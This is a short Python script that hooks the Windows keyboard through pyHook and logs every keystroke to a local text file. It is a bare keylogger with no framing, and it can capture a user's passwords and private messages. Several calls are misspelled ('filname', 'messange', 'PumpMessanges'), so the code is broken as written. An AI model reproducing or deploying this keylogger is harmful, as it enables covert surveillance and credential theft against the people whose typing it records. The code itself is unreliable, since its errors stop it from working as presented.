import pyHook, pythoncom, sys, logging

logfile = 'c:\\log\\log.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filname=logfile, level=logging.DEBUG, format='%(messange)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessanges()